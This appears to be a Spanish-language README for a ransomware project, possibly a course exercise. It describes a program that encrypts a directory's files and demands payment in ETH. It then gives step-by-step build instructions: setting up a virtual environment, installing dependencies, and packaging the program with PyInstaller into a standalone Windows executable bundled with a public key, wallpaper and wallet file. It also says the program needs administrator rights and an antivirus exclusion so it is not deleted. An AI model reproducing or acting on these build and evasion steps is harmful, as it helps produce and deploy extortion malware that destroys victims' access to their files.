# cripto-ransomware-p7

## Descripción
El programa es un ransomware que encripta los archivos de un directorio y solicita un pago en ETH para desencriptarlos.

Para generar el ejecutable se utilizó PyInstaller. Se debe correr en un entorno virtual de Python 3.8 en Windows 10 para asegurar la compatibilidad.

Una vez generado el ejecutable, se puede ejecutar en cualquier sistema operativo Windows 10 (no es necesario tener Python instalado).

El ransomware **necesita** permisos de administrador para poder ejecutarse. No es necesario apagar el antivirus para ejecutar el ransomware, pero para que al final no sea eliminado el ejecutable, se debe agregar una excepción en el antivirus o desactivarlo.



Para crear el entorno virtual, ejecutar el siguiente comando:

```bash
python -m venv venv
```

Para activar el entorno virtual, en Windows:

```bash
venv\Scripts\activate.bat
```

Instalar las dependencias:

```bash
pip install -r requirements.txt
```

Para crear el ejecutable, ejecutar el siguiente comando:

```bash
pyinstaller --onefile --add-data "public_key.pem;." --add-data "fondo.jpeg;." --add-data "wallet.txt;." main.py
```